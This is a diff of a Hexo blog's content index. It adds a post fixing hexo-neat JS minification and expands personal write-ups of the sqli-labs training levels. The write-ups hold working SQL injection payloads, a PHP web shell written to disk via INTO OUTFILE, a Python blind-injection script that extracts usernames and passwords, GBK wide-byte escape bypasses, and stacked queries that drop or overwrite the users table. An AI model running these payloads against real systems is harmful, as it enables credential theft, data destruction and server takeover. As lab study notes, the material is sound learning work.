@@ -17,6 +17,23 @@
       </tags>
   </entry>
   <entry>
+    <title>hexo-neat无法压缩部分js文件,已解决</title>
+    <url>/2024/11/10/hexo-neat%E4%B8%8D%E8%83%BD%E5%8E%8B%E7%BC%A9%E9%83%A8%E5%88%86js%E6%96%87%E4%BB%B6-%E8%A7%A3%E5%86%B3/</url>
+    <content><![CDATA[<p>打印报错发现原因是hexo-neat使用的UglifyJS不支持ES6<br> <span id="more"></span><br><img src="/../img/hexo-neat/1.jpg" alt="试试图片" loading="lazy"></p>
+<h5 id="解决方法，用terser替换UglifyJS。"><a href="#解决方法，用terser替换UglifyJS。" class="headerlink" title="解决方法，用terser替换UglifyJS。"></a>解决方法，用terser替换UglifyJS。</h5><p>terser的api: <a href="https://terser.nodejs.cn/docs/api-reference/">链接</a><br>进入[hexo根目录]&#x2F;node_modules&#x2F;hexo-neat&#x2F;目录下安装terser</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install terser --save-dev</span><br></pre></td></tr></table></figure>
+<p>将hexo-neat&#x2F;lib&#x2F;filter.js中的logiv_js的UglifyJS换成terser</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入const &#123; minify &#125; = require(&quot;terser&quot;);</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">logic_js</span>(<span class="params">str, data</span>) &#123;</span><br><span class="line">    <span class="comment">//let js_result = str;</span></span><br><span class="line">    <span class="keyword">var</span> hexo = <span class="variable language_">this</span>,</span><br><span class="line">        options = hexo.<span class="property">config</span>.<span class="property">neat_js</span>;</span><br><span class="line">    <span class="comment">// Return if disabled.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === options.<span class="property">enable</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> path = data.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">var</span> exclude = options.<span class="property">exclude</span>;</span><br><span class="line">    <span class="keyword">if</span> (exclude &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(exclude)) exclude = [exclude];</span><br><span class="line">    <span class="keyword">if</span> (path &amp;&amp; exclude &amp;&amp; exclude.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = exclude.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">minimatch</span>(path, exclude[i], &#123; <span class="attr">matchBase</span>: <span class="literal">true</span> &#125;)) <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//var result = UglifyJS.minify(str, options);</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">minify</span>(str);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;!!!!!!!!&#x27;</span>+path+<span class="string">&#x27;ERROR:&#x27;</span>+error);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> saved = (((str.<span class="property">length</span> - result.<span class="property">code</span>.<span class="property">length</span>) / str.<span class="property">length</span>) * <span class="number">100</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">logger</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> log = hexo.<span class="property">log</span> || <span class="variable language_">console</span>.<span class="property">log</span>;</span><br><span class="line">        log.<span class="title function_">log</span>(<span class="string">&#x27;neat the js: %s [ %s saved]&#x27;</span>, path, saved + <span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.<span class="property">code</span>+<span class="string">&#x27;\n//rebuild by neat terser&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>没有报错了<br><img src="/../img/hexo-neat/2.jpg" alt="试试图片" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>环境</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>db</title>
     <url>/2024/10/13/db/</url>
     <content><![CDATA[<p>1<br> <span id="more"></span></p>
@@ -35,23 +52,6 @@
       </categories>
       <tags>
         <tag>deb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo-neat无法压缩部分js文件,已解决</title>
-    <url>/2024/11/10/hexo-neat%E4%B8%8D%E8%83%BD%E5%8E%8B%E7%BC%A9%E9%83%A8%E5%88%86js%E6%96%87%E4%BB%B6-%E8%A7%A3%E5%86%B3/</url>
-    <content><![CDATA[<p>打印报错发现原因是hexo-neat使用的UglifyJS不支持ES6<br> <span id="more"></span><br><img src="/../img/hexo-neat/1.jpg" alt="试试图片" loading="lazy"></p>
-<h5 id="解决方法，用terser替换UglifyJS。"><a href="#解决方法，用terser替换UglifyJS。" class="headerlink" title="解决方法，用terser替换UglifyJS。"></a>解决方法，用terser替换UglifyJS。</h5><p>terser的api: <a href="https://terser.nodejs.cn/docs/api-reference/">链接</a><br>进入[hexo根目录]&#x2F;node_modules&#x2F;hexo-neat&#x2F;目录下安装terser</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install terser --save-dev</span><br></pre></td></tr></table></figure>
-<p>将hexo-neat&#x2F;lib&#x2F;filter.js中的logiv_js的UglifyJS换成terser</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入const &#123; minify &#125; = require(&quot;terser&quot;);</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">logic_js</span>(<span class="params">str, data</span>) &#123;</span><br><span class="line">    <span class="comment">//let js_result = str;</span></span><br><span class="line">    <span class="keyword">var</span> hexo = <span class="variable language_">this</span>,</span><br><span class="line">        options = hexo.<span class="property">config</span>.<span class="property">neat_js</span>;</span><br><span class="line">    <span class="comment">// Return if disabled.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === options.<span class="property">enable</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> path = data.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">var</span> exclude = options.<span class="property">exclude</span>;</span><br><span class="line">    <span class="keyword">if</span> (exclude &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(exclude)) exclude = [exclude];</span><br><span class="line">    <span class="keyword">if</span> (path &amp;&amp; exclude &amp;&amp; exclude.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = exclude.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">minimatch</span>(path, exclude[i], &#123; <span class="attr">matchBase</span>: <span class="literal">true</span> &#125;)) <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//var result = UglifyJS.minify(str, options);</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">minify</span>(str);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;!!!!!!!!&#x27;</span>+path+<span class="string">&#x27;ERROR:&#x27;</span>+error);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> saved = (((str.<span class="property">length</span> - result.<span class="property">code</span>.<span class="property">length</span>) / str.<span class="property">length</span>) * <span class="number">100</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">logger</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> log = hexo.<span class="property">log</span> || <span class="variable language_">console</span>.<span class="property">log</span>;</span><br><span class="line">        log.<span class="title function_">log</span>(<span class="string">&#x27;neat the js: %s [ %s saved]&#x27;</span>, path, saved + <span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.<span class="property">code</span>+<span class="string">&#x27;\n//rebuild by neat terser&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>没有报错了<br><img src="/../img/hexo-neat/2.jpg" alt="试试图片" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>环境</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -199,14 +199,23 @@
 <h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and updatexml(1, concat(0x7e,version()), 3) --+双引号 其他同5</span><br><span class="line">?id=1&quot; <span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="string">&#x27;~&#x27;</span>,substr( (<span class="keyword">select</span> group_concat(column_name,<span class="string">&#x27;-&#x27;</span>,table_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) ,<span class="number">60</span>,<span class="number">31</span>) ), <span class="number">3</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>@@datadir获取数据库存储数据路径 ，@@basedir是MYSQL获取安装路径,可以去less1找，或者盲注<br>?id&#x3D;1&#39;)) and (select count(*) from mysql.user)&gt;0 --+ 如果返回正常则有读取权限<br>参考: <a href="https://blog.csdn.net/m0_46315342/article/details/106557552">参考</a></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span><span class="number">123</span><span class="string">&#x27;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/sqli-labs-php7/Less-3/1.php&quot; -- +</span></span><br></pre></td></tr></table></figure>
-<h2 id="less-8-布尔盲注"><a href="#less-8-布尔盲注" class="headerlink" title="less-8 布尔盲注"></a>less-8 布尔盲注</h2><p>用python的req查找<br>url&#x3D;&quot;。。。Less-8&#x2F;?id&#x3D;&quot;+&quot;1&#39; and &#39;&quot;  +c+  &quot;&#39;&gt; SUBSTR((select group_concat(username,&#39;-&#39;,password) from users),&quot;+idx+&quot;,1);--+&quot;<br>mysql不分大小写，用上面的方法返回的均是大写，可用ASCII()解决<br>url&#x3D;&quot;。。。Less-8&#x2F;?id&#x3D;&quot;+&quot;1&#39; and &#39;&quot; +str(ord(c))+ &quot;&#39;&gt; ASCII(SUBSTR((select group_concat(username,&#39;-&#39;,password) from users),&quot;+idx+&quot;,1));--+&quot;</p>
+<h2 id="less-8-布尔盲注"><a href="#less-8-布尔盲注" class="headerlink" title="less-8 布尔盲注"></a>less-8 布尔盲注</h2><p>用python的req查找</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">url=<span class="string">&quot;。。。Less-8/?id=&quot;</span>+<span class="string">&quot;1&#x27; and &#x27;&quot;</span>  +c+  <span class="string">&quot;&#x27;&gt; SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),&quot;</span>+idx+<span class="string">&quot;,1);--+&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>mysql不分大小写，用上面的方法返回的均是大写，可用ASCII()解决</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">url=<span class="string">&quot;。。。Less-8/?id=&quot;</span>+<span class="string">&quot;1&#x27; and &#x27;&quot;</span> +<span class="built_in">str</span>(<span class="built_in">ord</span>(c))+ <span class="string">&quot;&#x27;&gt; ASCII(SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),&quot;</span>+idx+<span class="string">&quot;,1));--+&quot;</span></span><br></pre></td></tr></table></figure>
 <details>
 <summary><font color='yellowgreen'>布尔盲注脚本(展开)</font></summary>
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):</span><br><span class="line">    idx=<span class="built_in">str</span>(idx)</span><br><span class="line">    url=<span class="string">&quot;http://192.168.86.131/sqli-labs/Less-8/?id=&quot;</span>+<span class="string">&quot;1&#x27; and &#x27;&quot;</span>  +<span class="built_in">str</span>(<span class="built_in">ord</span>(c))+  <span class="string">&quot;&#x27;&gt; ASCII(SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),&quot;</span>+idx+<span class="string">&quot;,1));--+&quot;</span></span><br><span class="line">    res=requests.get(url) <span class="comment">#注入 c &gt; str切片(idx,1) #结果为真执行if          </span></span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*You are in*&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span>(t) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(<span class="built_in">chr</span>(p) , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
 </details>
 
-<h2 id="less-9-时间盲注"><a href="#less-9-时间盲注" class="headerlink" title="less-9 时间盲注"></a>less-9 时间盲注</h2><p>参考hello-ctf:<br>IF(condition, value_if_true, value_if_false)<br>SELECT * FROM users WHERE username&#x3D;&#39;admin&#39; AND IF(SLEEP(5),1,0) 不存在用户名为 admin 的用户，那么该语句将会立即返回结束；否则，程序将会暂停 5 秒钟后再返回结果。<br>less-8的 ?id&#x3D;1&#39; and &#39;x&#39;&gt; ASCII(SUBSTR((select group_concat(username,&#39;-&#39;,password) from users),IDX,1));--+&quot;<br>?id&#x3D;1&#39; and if(1&#x3D;1,sleep(5),0)--+<br><strong>?id&#x3D;1&#39; and if((120&gt; ASCII(SUBSTR((select group_concat(username,&#39;-&#39;,password) from users),1,1))),sleep(5),0)--+</strong><br>改一下cmp函数就能用了</p>
+<h2 id="less-9-时间盲注"><a href="#less-9-时间盲注" class="headerlink" title="less-9 时间盲注"></a>less-9 时间盲注</h2><p>参考hello-ctf:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">IF(<span class="keyword">condition</span>, value_if_true, value_if_false)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> IF(SLEEP(<span class="number">5</span>),<span class="number">1</span>,<span class="number">0</span>) </span><br></pre></td></tr></table></figure>
+<p>不存在用户名为 admin 的用户，那么该语句将会立即返回结束；否则，程序将会暂停 5 秒钟后再返回结果。  </p>
+<p>less-8的 </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span>x<span class="string">&#x27;&gt; ASCII(SUBSTR((select group_concat(username,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,password) from users),IDX,1));--+&quot;</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if((120&gt; ASCII(SUBSTR((select group_concat(username,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,password) from users),1,1))),sleep(5),0)--+</span></span><br></pre></td></tr></table></figure>
+<p>改一下cmp函数就能用了</p>
 <details>
 <summary><font color='yellowgreen'>二分法时间盲注(展开)</font></summary>
 
@@ -315,8 +324,8 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs-less-28到35</title>
-    <url>/2024/11/28/sqli-labs-less-28-35/</url>
+    <title>sqli-labs-less-28到37</title>
+    <url>/2024/11/28/sqli-labs-less-28-37/</url>
     <content><![CDATA[<h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>%00结束语句，有攻略使用%a0 这里不行。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;);%00</span></span><br><span class="line"><span class="string">&#x27;</span>) <span class="operator">%</span><span class="number">0</span>B <span class="keyword">UniON</span> <span class="operator">%</span><span class="number">0</span>B <span class="keyword">sElect</span> <span class="operator">%</span><span class="number">0</span>B <span class="number">1</span>,<span class="number">2</span>,database();<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure>
 <p>less-28a 同上</p>
@@ -346,28 +355,65 @@
 <p>GBK编码的字符有单字节和双字节两种表示方式：<br>[00,7F]范围内只读一个字节，与ASCII码一致。<br>第一字节属于[81,FE]就判断为双字节，第二字节在[40,FE]范围内</p>
 <p>\  5C<br>&#39;  27<br>縗 bf5c<br>0%bf&#39; 30bf5c27<br>php在27前插入5c，变成30bf5c27，再传给mysql<br>mysql读到bf 按照gbk规则，这是双字节字符，并掉了5c 反斜杠</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span>bf<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
-<h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>hex编辑AB 5C 保存至文本，vscode打开文本，右下角，以gbk重新打开<br>AB的二进制是 10101011 按照utf-8的规则，开头只有一个连续的1，就只读一个字节<br>但是单个字节的字符集中没有AB，于是变成�<br>�的HEX都是EF BF BD<br>�\ HEX: EF BF BD 5C -gbk-&gt;锟絓<br>再utf-8下编辑:����� HEX:EFBF BDEF BFBD EFBF BDEF BFBD EFBF BD<br>以gbk重新打开:锟斤拷锟斤拷锟� 最后的�也是gbk找不到单独的BD来造成的，保存后会变成普通?</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">usrname: �<span class="string">&#x27; or 1#</span></span><br><span class="line"><span class="string">usrname: ⛅&#x27;</span> <span class="keyword">or</span> id<span class="operator">=</span><span class="number">11</span># 末尾大于<span class="number">81</span>的<span class="number">3</span>字节字符都可以使用</span><br></pre></td></tr></table></figure>
+<h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>hex编辑AB 5C 保存至文本，vscode打开文本，右下角，以gbk重新打开<br>AB的二进制是 10101011 按照utf-8的规则，没有这个字符，于是变成�\</p>
+<table>
+<thead>
+<tr>
+<th>unicode</th>
+<th>utf-8 <a href="https://segmentfault.com/a/1190000039294107">表格引用链接</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0000 0000-0000 007F</td>
+<td>0xxxxxxx</td>
+</tr>
+<tr>
+<td>0000 0080-0000 07FF</td>
+<td>110xxxxx 10xxxxxx</td>
+</tr>
+<tr>
+<td>0000 0800-0000 FFFF</td>
+<td>1110xxxx 10xxxxxx 10xxxxxx</td>
+</tr>
+<tr>
+<td>0001 0000-0010 FFFF</td>
+<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
+</tr>
+<tr>
+<td>将unicode码点的二进制依次填入对应范围的utf-8的x里，完成转换</td>
+<td></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>�的uniocde码点是FFFD 1111 1111 1111 1101<br>命中0000 0800-0000 FFFF<br> <strong>1110</strong>xxxx <strong>10</strong>xxxxxx <strong>10</strong>xxxxxx<br> <strong>1110</strong>1111 <strong>10</strong>111111 <strong>10</strong>111101<br> EF   BF  BD</p>
+</blockquote>
+<ul>
+<li>�的HEX都是EF BF BD  </li>
+<li>�\ HEX: EF BF BD 5C -gbk-&gt;锟絓  </li>
+<li>再utf-8下编辑:����� HEX:EFBF BDEF BFBD EFBF BDEF BFBD EFBF BD  </li>
+<li>以gbk重新打开:锟斤拷锟斤拷锟� 最后的�也是gbk找不到单独  的BD来造成的，保存后会变成普通?<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">usrname: �<span class="string">&#x27; or 1#</span></span><br><span class="line"><span class="string">usrname: ⛅&#x27;</span> <span class="keyword">or</span> id<span class="operator">=</span><span class="number">11</span># 末尾大于<span class="number">81</span>的<span class="number">3</span>字节字符都可以使用</span><br><span class="line">随<span class="number">1</span>便<span class="string">&#x27; or id=11#</span></span><br></pre></td></tr></table></figure>
 <textarea class="form-control" id="enInput" cols="20" rows="5"  placeholder="" style="background: rgb(43, 43, 43);color: rgb(206, 206, 206);"></textarea>
 <textarea class="form-control" id="midRST" cols="20" rows="5" placeholder="" style="background: rgb(43, 43, 43);color: rgb(206, 206, 206);"></textarea>
 <script>
-    document.getElementById("enInput").value='⛅�';
-    document.getElementById("midRST").value='%E2%9B%85%EF%BF%BD';
-    function encodeurl(){
-        var s=document.getElementById("enInput").value;
-        document.getElementById("midRST").value=encodeURIComponent(s);
-    }
-    el=document.getElementById('enInput')
-    el.addEventListener("input", function () {
-                        encodeurl(this);
-                        }, false);
-    el.addEventListener("selectionchange", function () {
-                        encodeurl(this);
-                        }, false);
-</script>
-
+  document.getElementById("enInput").value='⛅�';
+  document.getElementById("midRST").value='%E2%9B%85%EF%BF%BD';
+  function encodeurl(){
+      var s=document.getElementById("enInput").value;
+      document.getElementById("midRST").value=encodeURIComponent(s);
+  }
+  el=document.getElementById('enInput')
+  el.addEventListener("input", function () {
+                      encodeurl(this);
+                      }, false);
+  el.addEventListener("selectionchange", function () {
+                      encodeurl(this);
+                      }, false);</li>
+</ul>
+<p></script></p>
 <h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><p>gbk但是数字注入</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select%20 1,2,3--+</span><br></pre></td></tr></table></figure>
+<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=%bb&#x27; or id=11--+</span><br></pre></td></tr></table></figure>
+<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">usrname: 和<span class="number">34</span>差不多<span class="string">&#x27; or id=11#</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>sqli</category>
@@ -378,9 +424,27 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs-less-35-45</title>
+    <title>sqli-labs-less-38-45</title>
     <url>/2024/12/04/sqli-labs-less-35-45/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>堆叠注入 ,这关用的是mysqli_multi_query($con1, $sql)函数，以前都用mysql_query($sql);</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$con1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_more_results</span>(<span class="variable">$con1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;-----------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用分号分隔语句，服务器会依次执行。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3;&#x27;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> users;</span><br><span class="line"><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h3 id="less-39，41"><a href="#less-39，41" class="headerlink" title="less-39，41"></a>less-39，41</h3><ul>
+<li>39：数字注入，同上</li>
+<li>40：&#39;)闭合</li>
+<li>41: 不回显的堆叠注入</li>
+</ul>
+<h2 id="less-42，45"><a href="#less-42，45" class="headerlink" title="less-42，45"></a>less-42，45</h2><p>passwd没有过滤</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">usrname:随便</span><br><span class="line">passwd: <span class="number">1</span><span class="string">&#x27;;UPDATE users SET password =&#x27;</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">UPDATE users SET username=&#x27;</span><span class="number">1</span><span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>43 <code>&#39;);create table less43 like users#</code></li>
+<li>44 无报错回显的42</li>
+<li>45 无报错回显的43</li>
+</ul>
+<h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>?sort&#x3D;(ascii(right(database(),1))-113)</p>
+]]></content>
       <categories>
         <category>sqli</category>
       </categories>
